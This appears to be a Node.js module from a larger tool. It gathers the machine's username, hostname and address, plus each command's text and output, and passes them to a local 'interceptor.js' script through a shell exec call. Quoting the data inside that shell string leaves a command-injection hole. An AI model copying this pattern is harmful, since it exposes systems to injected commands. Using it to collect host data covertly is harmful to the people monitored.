const { getUsername, getHostname, getAddress } = require('./utils');
const { exec } = require('child_process');
const path = require('path');


function serverPath()
{
	const server = path.join(__dirname, '../../server/interceptor.js');

	return server;
}

function emitNet(message) {
	
	exec(`node ${serverPath()} '${JSON.stringify(message)}'`, (error, stdout, stderr) => {
		if (error) {
			return;
		}
	});

}


function connect()
{
	
	const data = {
		type: 'connect',
		username: getUsername(),
		hostname: getHostname(),
		address: getAddress()
	}

	emitNet(data);
}

function command(command, error, stdout, stderr) {

	const data = {
		type: 'command',
		username: getUsername(),
		hostname: getHostname(),
		address: getAddress(),
		command: command,
		error: error,
		stdout: stdout,
		stderr: stderr
	}

	emitNet(data);

}

module.exports = { connect, command };